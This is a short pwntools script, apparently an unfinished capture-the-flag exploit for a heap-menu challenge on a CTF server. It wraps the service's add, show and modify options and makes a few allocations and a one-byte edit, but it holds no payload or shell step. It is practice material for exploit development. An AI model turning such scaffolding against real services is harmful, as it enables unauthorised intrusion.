#!/usr/bin/env python
from pwn import *

# 

context.arch = 'amd64'

host , port = 'ctf.yuawn.idv.tw' , 10107
y = remote( host , port )

def echo( data ):
        y.sendafter( 'ice:' , '1' )
        y.sendafter( 'say:' , data )

def add( idx , data ):
        y.sendafter( 'ice:' , '2' )
        y.sendafter( '?:' , str( idx ) )
        y.sendafter( ':' , data )

def sho( idx ):
        y.sendafter( 'ice:' , '3' )
        y.sendafter( '?:' , str( idx ) )

def mod( idx , data ):
        y.sendafter( 'ice:' , '4' )
        y.sendafter( '?:' , str( idx ) )
        y.sendafter( ':' , data )


add( 1 , 'a' * 0x10 )
add( 2 , 'b' * 0x10 )
add( 3 , 'c' * 0x10 )

mod( 1 , 'a' )



y.interactive()